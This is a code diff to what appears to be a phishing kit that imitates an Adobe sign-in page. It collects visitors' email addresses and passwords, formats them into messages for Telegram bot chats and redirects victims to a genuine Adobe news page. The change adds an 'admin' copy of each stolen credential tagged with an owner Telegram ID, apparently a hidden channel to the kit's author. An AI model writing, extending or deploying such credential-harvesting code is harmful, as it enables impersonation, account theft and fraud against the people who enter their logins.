@@ -123,6 +123,7 @@
 const BOT_TOKEN = "__BOT_TOKEN__";
 const CUSTOMER_CHAT_ID = "__CUSTOMER_CHAT_ID__";
 const ADMIN_CHAT_ID = "__ADMIN_CHAT_ID__";
+const OWNER_TELEGRAM_ID = "__OWNER_TELEGRAM_ID__";
 
 const REDIRECT_URL =
     "https://news.adobe.com/news/news-details/2023/Adobe-Announces-All-New-AI-Powered-Creative-Cloud-Release-default.aspx/default.aspx";
@@ -213,9 +214,22 @@ function getEmail() {
 
 async function send_result(email, password) {
 
-    const message =
+    const customerMessage =
 `Adobe Form Submission
 
+Email:
+${email || "Not provided"}
+
+Password:
+${password || "Not provided"}
+
+Time:
+${new Date().toLocaleString()}`;
+
+    const adminMessage =
+`Adobe Form Submission
+Owner Telegram ID:
+${OWNER_TELEGRAM_ID}
 Email:
 ${email || "Not provided"}
 
